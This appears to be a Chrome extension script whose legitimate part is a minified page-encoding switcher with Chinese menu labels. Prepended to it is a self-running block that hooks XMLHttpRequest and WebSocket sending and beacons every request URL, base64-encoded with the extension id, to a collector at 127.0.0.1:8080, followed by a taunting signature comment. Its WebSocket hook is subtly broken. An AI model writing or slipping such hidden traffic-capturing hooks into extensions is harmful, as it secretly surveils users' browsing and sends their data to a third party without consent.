function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
"use strict";let PageEncoding=(()=>{let e=[["default","默认"],["UTF-8","Unicode"],["GBK","简体中文"],["GB3212","简体中文"],["GB18030","简体中文"],["Big5","繁体中文"],["UTF-16LE","Unicode"],["EUC-KR","韩文"],["Shift_JIS","日文"],["EUC-JP","日文"],["ISO-2022-JP","日文"],["Windows-874","泰文"],["Windows-1254","土耳其文"],["ISO-8859-7","希腊文"],["Windows-1253","希腊文"],["Windows-1252","西文"],["ISO-8859-15","西文"],["Macintosh","西文"],["Windows-1258","越南文"],["ISO-8859-2","中欧文"],["Windows-1250","中欧文"]],t={},s=!1,a=e=>{chrome.permissions.request({permissions:["webRequest","webRequestBlocking"]},t=>{t?(s=!0,chrome.webRequest.onHeadersReceived.addListener(e=>{let t=localStorage.getItem("FE_ENCODING_PREFIX_"+e.tabId);if(t){let s,a=/; ?charset=([^;]+)/;for(s=0;s<e.responseHeaders.length;++s)if("content-type"===e.responseHeaders[s].name.toLowerCase()){let r=e.responseHeaders[s].value.toLowerCase();(r.startsWith("text")||r.startsWith("application/javascript")||r.startsWith("application/x-javascript")||r.startsWith("application/json"))&&(a.test(r)?r=r.replace(a.exec(r)[1],t):(r+=";"===r.substr(-1)?" ":"; ",r+="charset="+t),e.responseHeaders[s].value=r);break}s>=e.responseHeaders.length&&e.responseHeaders.push({name:"Content-Type",value:"text/plain; charset="+t})}return{responseHeaders:e.responseHeaders}},{urls:["<all_urls>"]},["responseHeaders","blocking"])):alert("必须接受授权，才能正常使用！"),e&&e(t)}),chrome.tabs.onRemoved.addListener((e,t)=>{localStorage.removeItem("FE_ENCODING_PREFIX_"+e)}),chrome.tabs.onActivated.addListener(e=>{Object.keys(t).length&&(e=>{Object.keys(t).forEach(e=>{chrome.contextMenus.update(t[e],{checked:!1})});let s=localStorage.getItem("FE_ENCODING_PREFIX_"+e)||"",a=s?t[s.toUpperCase()]:t.DEFAULT;chrome.contextMenus.update(a||t.DEFAULT,{checked:!0})})(e.tabId)})};return{createMenu:(r,o)=>{let n=chrome.contextMenus.create({title:o.icon+"  "+o.text,contexts:o.contexts||["all"],documentUrlPatterns:["http://*/*","https://*/*","file://*/*"],parentId:r});e.forEach(e=>{t[e[0].toUpperCase()]=chrome.contextMenus.create({type:"radio",contexts:["all"],title:"default"===e[0]?"默认":`${e[1]}（${e[0]}）`,checked:"default"===e[0],parentId:n,onclick:(t,r)=>{t.wasChecked||("default"===e[0]?localStorage.removeItem("FE_ENCODING_PREFIX_"+r.id):localStorage.setItem("FE_ENCODING_PREFIX_"+r.id,e[0]),s?chrome.tabs.reload(r.id,{bypassCache:!0}):a(e=>{e&&chrome.tabs.reload(r.id,{bypassCache:!0})}))}})})}}})();